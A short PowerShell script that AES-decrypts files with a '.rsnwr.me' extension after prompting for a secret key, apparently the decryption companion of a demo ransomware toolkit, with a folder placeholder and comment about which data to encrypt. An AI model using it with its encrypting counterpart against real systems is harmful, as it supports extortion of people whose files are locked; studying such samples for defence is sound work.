function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }

    $aesManaged
}


function Decrypt-File($bytes, $key) {

    $IV = $bytes[0..15]


    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()

    return $unencryptedData
}




$files = Get-ChildItem -Path "PATH/TO/FOLDER/TO/ENCRYPT/DATA" #exclude system files!!!


Write-Host "To decrypt your data insert the secret key:"

$keyBase64 = Read-Host
$key = [System.Convert]::FromBase64String($keyBase64)

foreach ($file in $files)
{

    $encryptedFile = [System.IO.File]::ReadAllBytes($file.FullName)
    $decryptedFile = Decrypt-File $encryptedFile $key

    $newFilePath = $file.FullName.Replace(".rsnwr.me", "")

    [System.IO.File]::WriteAllBytes($newFilePath,$decryptedFile)

    Remove-Item $file.FullName
}
